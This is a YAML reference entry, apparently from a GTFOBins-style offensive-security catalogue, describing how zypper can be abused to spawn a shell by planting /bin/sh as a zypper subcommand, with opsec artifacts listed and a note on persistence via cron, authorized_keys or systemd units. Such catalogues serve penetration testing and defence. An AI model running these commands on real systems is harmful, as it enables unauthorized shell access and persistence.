---
name: zypper
capabilities:
- exec
- spawn
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    cp /bin/sh /usr/lib/zypper/commands/zypper-x
    zypper x
  notes: The copy usually requires elevated privileges.
- id: shell-2
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    cp /bin/sh /path/to/temp-dir/zypper-x
    PATH=$PATH:/path/to/temp-dir/ zypper x
references:
- https://gtfobins.github.io/gtfobins/zypper/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
